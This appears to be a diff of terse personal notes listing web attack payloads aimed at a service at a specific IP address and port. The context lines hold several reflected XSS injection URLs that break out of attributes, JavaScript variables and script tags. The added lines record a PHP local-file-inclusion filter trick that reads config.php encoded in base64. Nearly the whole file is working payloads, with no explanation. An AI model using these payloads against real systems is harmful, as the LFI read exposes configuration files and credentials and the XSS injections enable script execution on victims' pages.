@@ -10,6 +10,9 @@ XSS
 
 92.60.14.134:8081/xss/iframe3?path=asdfasdf" onload="alert('blabla')
 
+LFI -> php -> 
+ php://filter/convert.base64-encode/resource=config.php
+
 http://92.60.14.134:8081/xss/jsvar1?count=99%22);alert(2);//
 
 http://92.60.14.134:8081/xss/jsvar2?count=33);%3C/script%3E%3Cscript%3Ealert(2)%3C/script%3E
